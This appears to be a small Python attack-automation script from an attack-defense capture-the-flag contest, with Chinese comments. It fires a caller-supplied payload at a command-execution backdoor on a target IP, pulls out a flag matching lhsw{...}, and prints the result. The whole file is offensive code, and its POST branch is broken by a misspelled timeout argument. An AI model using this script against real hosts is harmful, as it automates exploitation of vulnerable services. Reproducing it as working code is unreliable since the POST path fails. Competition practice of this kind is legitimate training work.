import requests
import re


def backdoor_attack(ip, url_path, method, payload):  # 命令执行漏洞
    try:
        if method == 'get':
            r = requests.get('http://' + ip + url_path + payload, timeout=5)
        elif method == 'post':
            r = requests.post("http://" + ip + url_path,
                              data=payload, timout=5)
        # 正则匹配flag
        flag = re.search(r'lhsw\{.*\}', r.text).group()
        # 打印攻击结果
        print('[FLAGS]'+ip+'>>>>>>'+flag)
        return flag

    except Exception as e:
        print('[ERROR]' + ip + '>>>>>>backdoor_attack()执行失败>>>>>>' + str(e))
        return False
